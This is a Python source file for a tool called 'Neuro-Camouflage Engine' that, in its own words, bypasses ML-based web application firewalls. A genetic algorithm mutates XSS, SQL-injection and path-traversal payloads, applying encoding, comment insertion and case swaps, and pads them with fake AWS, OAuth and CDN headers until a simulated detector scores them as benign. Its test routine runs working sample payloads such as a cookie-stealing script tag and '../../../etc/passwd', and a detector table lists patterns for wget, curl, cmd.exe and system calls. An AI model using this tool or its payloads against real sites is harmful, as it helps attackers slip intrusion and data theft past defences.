"""
NEURO-CAMOUFLAGE ENGINE
=======================
Adversarial AI evasion module for bypassing ML-based WAF detection.

crafted by :: kakashi4kx / kakashi-kx
"""

import asyncio
import hashlib
import math
import random
import re
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import structlog

logger = structlog.get_logger(__name__)


class PayloadCategory(Enum):
    XSS = "xss"
    SQLI = "sqli"
    PATH_TRAVERSAL = "path_traversal"
    COMMAND_INJECTION = "command_injection"
    XXE = "xxe"
    SSTI = "ssti"
    GENERAL = "general"


@dataclass
class Payload:
    content: str
    category: PayloadCategory
    generation: int = 0
    fitness_score: float = 1.0
    parent_ids: List[str] = field(default_factory=list)
    mutation_history: List[str] = field(default_factory=list)
    injected_tokens: List[str] = field(default_factory=list)
    detection_score: float = 1.0
    bypass_probability: float = 0.0

    @property
    def id(self) -> str:
        return hashlib.md5(self.content.encode()).hexdigest()[:12]


@dataclass
class EvolutionResult:
    original_payload: Payload
    best_payload: Payload
    generations: int
    population_history: List[List[Payload]]
    fitness_curve: List[float]
    total_mutations: int
    time_elapsed: float
    final_bypass_probability: float


BENIGN_TOKENS = {
    "aws_metadata": [
        "X-Forwarded-For: 169.254.169.254",
        "Authorization: AWS4-HMAC-SHA256 Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request",
        "X-Amz-Date: 20230524T000000Z",
        "X-Amz-Security-Token: FQoGZXIvYXdzE",
    ],
    "oauth2_headers": [
        "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ",
        "X-OAuth-Scopes: read,write,admin",
        "X-Client-ID: 1234567890.apps.googleusercontent.com",
    ],
    "api_schemas": [
        '{"swagger":"2.0","info":{"title":"API","version":"1.0"},"paths":{"/users":{"get":{"responses":{"200":{"description":"OK"}}}}}}',
        '{"openapi":"3.0.0","info":{"title":"PetStore","version":"1.0.0"},"paths":{}}',
    ],
    "graphql": [
        '{"query":"query { user(id: 1) { name email } }"}',
    ],
    "cdn_headers": [
        "CF-Connecting-IP: 192.0.2.1",
        "CF-IPCountry: US",
        "CF-Ray: 1234567890abcdef-SJC",
        "True-Client-IP: 203.0.113.1",
    ],
    "security_headers": [
        "Content-Security-Policy: default-src 'self'",
        "Strict-Transport-Security: max-age=31536000; includeSubDomains",
        "X-Content-Type-Options: nosniff",
        "X-Frame-Options: DENY",
    ],
    "encoding_markers": [
        "<!-- saved from url=(0014)about:internet -->",
        "/*! jQuery v3.6.0 | (c) OpenJS Foundation */",
    ],
}


class DetectionSimulator:
    MALICIOUS_PATTERNS = {
        r"<script.*?>": 0.8, r"javascript:": 0.7, r"onerror\s*=": 0.7,
        r"onload\s*=": 0.6, r"alert\s*\(": 0.6, r"eval\s*\(": 0.7,
        r"document\.cookie": 0.5, r"SELECT.*FROM": 0.6, r"UNION.*SELECT": 0.8,
        r"OR\s+1\s*=\s*1": 0.7, r"DROP\s+TABLE": 0.9, r"\.\.\/\.\.\/": 0.7,
        r"\/etc\/passwd": 0.8, r"cmd\.exe": 0.7, r"\/bin\/bash": 0.6,
        r"wget\s+http": 0.5, r"curl\s+http": 0.5, r"<\?php": 0.5,
        r"system\s*\(": 0.6, r"exec\s*\(": 0.6, r"passthru\s*\(": 0.7,
    }

    BENIGN_PATTERNS = {
        r"Authorization:\s*Bearer": -0.3, r"AWS4-HMAC-SHA256": -0.4,
        r"swagger": -0.2, r"openapi": -0.2, r"Content-Security-Policy": -0.3,
        r"Strict-Transport-Security": -0.2, r"jQuery\s+v\d": -0.2,
        r"application\/json": -0.1, r"text\/html;\s*charset": -0.1,
        r"<!--\s*saved\s+from": -0.25,
    }

    @classmethod
    def score_payload(cls, content: str) -> float:
        score = 0.0
        content_lower = content.lower()
        for pattern, weight in cls.MALICIOUS_PATTERNS.items():
            if re.search(pattern, content, re.IGNORECASE):
                score += weight
        for pattern, weight in cls.BENIGN_PATTERNS.items():
            if re.search(pattern, content, re.IGNORECASE):
                score += weight
        entropy = cls._calculate_entropy(content)
        if entropy > 5.5:
            score += 0.2
        elif entropy < 3.5:
            score -= 0.1
        if len(content) > 1000:
            score += 0.15
        elif len(content) < 10:
            score += 0.1
        return max(0.0, min(1.0, score))

    @classmethod
    def _calculate_entropy(cls, data: str) -> float:
        from collections import Counter
        if not data:
            return 0.0
        length = len(data)
        counter = Counter(data)
        return -sum((count / length) * math.log2(count / length) for count in counter.values())


class BenignTokenInjector:
    INJECTION_STRATEGIES = ["prefix", "suffix", "wrap", "interleave", "header_inject", "comment_hide"]

    @classmethod
    def inject_tokens(cls, payload: str, num_tokens: int = 3, strategy: str = "interleave",
                      token_categories: Optional[List[str]] = None) -> Tuple[str, List[str]]:
        if token_categories is None:
            token_categories = list(BENIGN_TOKENS.keys())
        available_tokens = []
        for category in token_categories:
            if category in BENIGN_TOKENS:
                available_tokens.extend(BENIGN_TOKENS[category])
        if not available_tokens:
            return payload, []
        selected_tokens = random.sample(available_tokens, min(num_tokens, len(available_tokens)))
        mutated = cls._apply_strategy(payload, selected_tokens, strategy)
        return mutated, selected_tokens

    @classmethod
    def _apply_strategy(cls, payload: str, tokens: List[str], strategy: str) -> str:
        token_text = "\n".join(tokens)
        if strategy == "prefix":
            return f"{token_text}\n{payload}"
        elif strategy == "suffix":
            return f"{payload}\n{token_text}"
        elif strategy == "wrap":
            return f"{tokens[0] if tokens else ''}\n{payload}\n{token_text}"
        elif strategy == "interleave":
            return cls._interleave(payload, tokens)
        elif strategy == "header_inject":
            header_block = "\n".join(f"X-Benign-{i}: {token[:50]}" for i, token in enumerate(tokens))
            return f"{header_block}\n\n{payload}"
        elif strategy == "comment_hide":
            return f"<!-- {token_text} -->\n{payload}\n<!-- {token_text} -->"
        return payload

    @classmethod
    def _interleave(cls, payload: str, tokens: List[str]) -> str:
        if not tokens:
            return payload
        parts = []
        chunk_size = max(1, len(payload) // (len(tokens) + 1))
        for i in range(0, len(payload), chunk_size):
            parts.append(payload[i:i + chunk_size])
            if tokens:
                parts.append(tokens.pop(0))
        return "".join(parts)


class GeneticEvolutionEngine:
    MUTATION_OPERATORS = [
        "character_case_swap", "html_entity_encode", "url_encode",
        "unicode_escape", "whitespace_variation", "comment_insertion",
        "string_concat", "eval_wrapper_variation", "tag_name_obfuscation",
        "attribute_order_swap", "add_benign_tokens",
    ]

    def __init__(self, population_size: int = 20, generations: int = 50,
                 mutation_rate: float = 0.3, crossover_rate: float = 0.5,
                 elite_size: int = 3, target_score: float = 0.1) -> None:
        self.population_size = population_size
        self.generations = generations
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
        self.elite_size = elite_size
        self.target_score = target_score

    def evolve(self, original_payload: str, category: PayloadCategory) -> EvolutionResult:
        start_time = time.time()
        original = Payload(content=original_payload, category=category)
        original.detection_score = DetectionSimulator.score_payload(original.content)
        original.fitness_score = 1.0 - original.detection_score
        population = self._create_initial_population(original)
        population_history = [population.copy()]
        fitness_curve = [self._calculate_population_fitness(population)]
        total_mutations = 0
        logger.info("evolution_started", original_score=original.detection_score)

        for generation in range(self.generations):
            for payload in population:
                payload.detection_score = DetectionSimulator.score_payload(payload.content)
                payload.fitness_score = 1.0 - payload.detection_score
                payload.bypass_probability = 1.0 - payload.detection_score
                payload.generation = generation + 1
            population.sort(key=lambda p: p.fitness_score, reverse=True)
            best = population[0]
            avg_fitness = self._calculate_population_fitness(population)
            fitness_curve.append(avg_fitness)
            if best.detection_score <= self.target_score:
                logger.info("target_score_reached", generation=generation + 1, score=best.detection_score)
                break
            next_population = list(population[:self.elite_size])
            while len(next_population) < self.population_size:
                parent1 = self._tournament_select(population)
                parent2 = self._tournament_select(population)
                if random.random() < self.crossover_rate:
                    child_content = self._crossover(parent1.content, parent2.content)
                else:
                    child_content = parent1.content
                if random.random() < self.mutation_rate:
                    child_content = self._mutate(child_content, category)
                    total_mutations += 1
                child = Payload(content=child_content, category=category,
                               parent_ids=[parent1.id, parent2.id])
                next_population.append(child)
            population = next_population[:self.population_size]
            population_history.append(population.copy())

        for payload in population:
            payload.detection_score = DetectionSimulator.score_payload(payload.content)
            payload.fitness_score = 1.0 - payload.detection_score
            payload.bypass_probability = 1.0 - payload.detection_score
        population.sort(key=lambda p: p.fitness_score, reverse=True)
        elapsed = time.time() - start_time
        result = EvolutionResult(
            original_payload=original, best_payload=population[0],
            generations=len(population_history), population_history=population_history,
            fitness_curve=fitness_curve, total_mutations=total_mutations,
            time_elapsed=elapsed, final_bypass_probability=population[0].bypass_probability,
        )
        logger.info("evolution_complete", original_score=f"{original.detection_score:.3f}",
                   best_score=f"{result.best_payload.detection_score:.3f}")
        return result

    def _create_initial_population(self, original: Payload) -> List[Payload]:
        population = [original]
        for _ in range(self.population_size - 1):
            mutated = self._mutate(original.content, original.category)
            variant = Payload(content=mutated, category=original.category, parent_ids=[original.id])
            population.append(variant)
        return population

    def _tournament_select(self, population: List[Payload], tournament_size: int = 3) -> Payload:
        tournament = random.sample(population, min(tournament_size, len(population)))
        return max(tournament, key=lambda p: p.fitness_score)

    def _crossover(self, content1: str, content2: str) -> str:
        if not content1 or not content2:
            return content1 or content2
        point1 = random.randint(0, len(content1) - 1) if len(content1) > 1 else 0
        point2 = random.randint(0, len(content2) - 1) if len(content2) > 1 else 0
        return content1[:point1] + content2[point2:]

    def _mutate(self, content: str, category: PayloadCategory) -> str:
        operator = random.choice(self.MUTATION_OPERATORS)
        return self._apply_mutation(content, operator, category)

    def _apply_mutation(self, content: str, operator: str, category: PayloadCategory) -> str:
        if operator == "character_case_swap":
            return "".join(c.swapcase() if random.random() < 0.3 else c for c in content)
        elif operator == "html_entity_encode":
            chars = random.sample(list(set(content)), min(3, len(set(content))))
            for char in chars:
                content = content.replace(char, f"&#{ord(char)};", 1)
            return content
        elif operator == "url_encode":
            chars = list(content)
            for i in range(len(chars)):
                if random.random() < 0.2:
                    chars[i] = f"%{ord(chars[i]):02X}"
            return "".join(chars)
        elif operator == "unicode_escape":
            chars = list(content)
            for i in range(len(chars)):
                if random.random() < 0.15:
                    chars[i] = f"\\u{ord(chars[i]):04x}"
            return "".join(chars)
        elif operator == "whitespace_variation":
            return content.replace(" ", "\t" if random.random() < 0.5 else "  ")
        elif operator == "comment_insertion":
            comments = ["/**/", "/*comment*/", "<!-- -->", "/*!50000*/"]
            comment = random.choice(comments)
            if len(content) > 2:
                pos = random.randint(0, len(content) - 1)
                content = content[:pos] + comment + content[pos:]
            return content
        elif operator == "string_concat":
            if len(content) > 4:
                pos = random.randint(1, len(content) - 2)
                content = content[:pos] + '"+"' + content[pos:]
            return content
        elif operator == "eval_wrapper_variation":
            wrappers = [f"eval('{content}')", f"(0, eval)('{content}')"]
            return random.choice(wrappers)
        elif operator == "tag_name_obfuscation":
            content = content.replace("<script", "<scrİpt").replace("<img", "<İmg")
            return content
        elif operator == "attribute_order_swap":
            return content.replace(" onerror=", " onload= onerror=")
        elif operator == "add_benign_tokens":
            mutated, _ = BenignTokenInjector.inject_tokens(
                content, num_tokens=random.randint(1, 4),
                strategy=random.choice(BenignTokenInjector.INJECTION_STRATEGIES))
            return mutated
        return content

    @staticmethod
    def _calculate_population_fitness(population: List[Payload]) -> float:
        if not population:
            return 0.0
        return sum(p.fitness_score for p in population) / len(population)


class NeuroCamouflage:
    def __init__(self, population_size: int = 30, generations: int = 50,
                 mutation_rate: float = 0.3, target_score: float = 0.15) -> None:
        self.population_size = population_size
        self.generations = generations
        self.mutation_rate = mutation_rate
        self.target_score = target_score
        self.evolution_engine = GeneticEvolutionEngine(
            population_size=population_size, generations=generations,
            mutation_rate=mutation_rate, target_score=target_score)

    def classify_payload(self, content: str) -> PayloadCategory:
        if re.search(r"<script|javascript:|onerror|onload", content, re.IGNORECASE):
            return PayloadCategory.XSS
        elif re.search(r"SELECT|UNION|DROP|INSERT|OR\s+1\s*=", content, re.IGNORECASE):
            return PayloadCategory.SQLI
        elif re.search(r"\.\.\/|\.\.\\|\/etc\/|C:\\\\", content):
            return PayloadCategory.PATH_TRAVERSAL
        elif re.search(r"cmd|bash|wget|curl|system|exec", content, re.IGNORECASE):
            return PayloadCategory.COMMAND_INJECTION
        elif re.search(r"<!ENTITY|SYSTEM", content, re.IGNORECASE):
            return PayloadCategory.XXE
        elif re.search(r"\{\{|\{%|jinja|twig", content, re.IGNORECASE):
            return PayloadCategory.SSTI
        else:
            return PayloadCategory.GENERAL

    async def camouflage(self, payload: str,
                         strategies: Optional[List[str]] = None) -> Dict[str, Any]:
        if strategies is None:
            strategies = ["token_injection", "evolution", "combined"]
        category = self.classify_payload(payload)
        original_score = DetectionSimulator.score_payload(payload)
        results = {
            "original_payload": payload, "category": category.value,
            "original_detection_score": original_score,
            "original_bypass_probability": 1.0 - original_score,
            "strategies_applied": strategies, "camouflaged_payloads": [],
            "evolution_result": None, "best_payload": None,
            "best_score": original_score, "improvement": 0.0, "improvement_percent": 0.0,
        }
        logger.info("neuro_camouflage_started", payload_length=len(payload),
                   category=category.value, original_score=f"{original_score:.3f}")

        if "token_injection" in strategies:
            for strategy in BenignTokenInjector.INJECTION_STRATEGIES:
                camouflaged, tokens = BenignTokenInjector.inject_tokens(
                    payload, num_tokens=5, strategy=strategy)
                score = DetectionSimulator.score_payload(camouflaged)
                results["camouflaged_payloads"].append({
                    "strategy": f"token_injection_{strategy}", "payload": camouflaged,
                    "score": score, "bypass_probability": 1.0 - score,
                    "injected_tokens": tokens,
                })

        if "evolution" in strategies:
            evo_result = self.evolution_engine.evolve(payload, category)
            results["evolution_result"] = {
                "generations": evo_result.generations,
                "total_mutations": evo_result.total_mutations,
                "fitness_curve": evo_result.fitness_curve,
                "best_payload": evo_result.best_payload.content,
                "best_score": evo_result.best_payload.detection_score,
                "improvement": original_score - evo_result.best_payload.detection_score,
                "time_elapsed": evo_result.time_elapsed,
            }
            if evo_result.best_payload.detection_score < results["best_score"]:
                results["best_score"] = evo_result.best_payload.detection_score
                results["best_payload"] = evo_result.best_payload.content

        if "combined" in strategies and results["evolution_result"]:
            evolved = results["evolution_result"]["best_payload"]
            camouflaged, _ = BenignTokenInjector.inject_tokens(
                evolved, num_tokens=5, strategy="interleave")
            score = DetectionSimulator.score_payload(camouflaged)
            results["camouflaged_payloads"].append({
                "strategy": "combined_evolution_injection", "payload": camouflaged,
                "score": score, "bypass_probability": 1.0 - score,
            })
            if score < results["best_score"]:
                results["best_score"] = score
                results["best_payload"] = camouflaged

        results["improvement"] = max(0, original_score - results["best_score"])
        denom = max(original_score, 0.01)
        results["improvement_percent"] = (original_score - results["best_score"]) / denom * 100
        logger.info("neuro_camouflage_complete", original_score=f"{original_score:.3f}",
                   best_score=f"{results['best_score']:.3f}")
        return results

    def generate_report(self, results: Dict[str, Any]) -> str:
        report = "# Neuro-Camouflage - Adversarial AI Evasion Report\n\n"
        report += "## Original Payload Analysis\n"
        report += f"- Type: {results['category']}\n"
        report += f"- Detection Score: {results['original_detection_score']:.3f}\n"
        report += f"- Bypass Probability: {results['original_bypass_probability']:.1%}\n\n"
        report += "## Camouflage Results\n"
        report += f"- Strategies Applied: {', '.join(results['strategies_applied'])}\n"
        report += f"- Best Score: {results['best_score']:.3f}\n"
        report += f"- Improvement: {results['improvement_percent']:.1f}%\n\n"
        report += "## Original Payload\n```\n"
        report += results['original_payload'] + "\n```\n\n"
        report += "## Best Camouflaged Payload\n```\n"
        report += str(results.get('best_payload', 'N/A')) + "\n```\n"
        if results.get("evolution_result"):
            evo = results["evolution_result"]
            report += "\n## Evolution Statistics\n"
            report += f"- Generations: {evo['generations']}\n"
            report += f"- Total Mutations: {evo['total_mutations']}\n"
            report += f"- Time Elapsed: {evo['time_elapsed']:.2f}s\n\n"
            report += "### Fitness Curve\n```\n"
            curve = evo["fitness_curve"]
            if curve:
                max_fitness = max(curve)
                if max_fitness <= 0:
                    max_fitness = 0.01
                for i, fitness in enumerate(curve):
                    bar_length = int(30 * fitness / max_fitness)
                    bar = "█" * bar_length
                    report += f"Gen {i:3d}: {bar} {fitness:.3f}\n"
            report += "```\n"
        report += "\n## All Variants\n\n"
        report += "| Strategy | Score | Bypass % |\n"
        report += "|----------|-------|----------|\n"
        report += f"| Original | {results['original_detection_score']:.3f} | {results['original_bypass_probability']:.1%} |\n"
        for variant in results["camouflaged_payloads"]:
            report += f"| {variant['strategy']} | {variant['score']:.3f} | {variant['bypass_probability']:.1%} |\n"
        return report


async def quick_test():
    neuro = NeuroCamouflage(population_size=10, generations=10)
    test_payloads = [
        "<script>alert(document.cookie)</script>",
        "' OR 1=1 --",
        "../../../etc/passwd",
    ]
    for payload in test_payloads:
        print(f"\n{'='*60}")
        print(f"Original: {payload}")
        results = await neuro.camouflage(payload)
        print(neuro.generate_report(results))


if __name__ == "__main__":
    asyncio.run(quick_test())
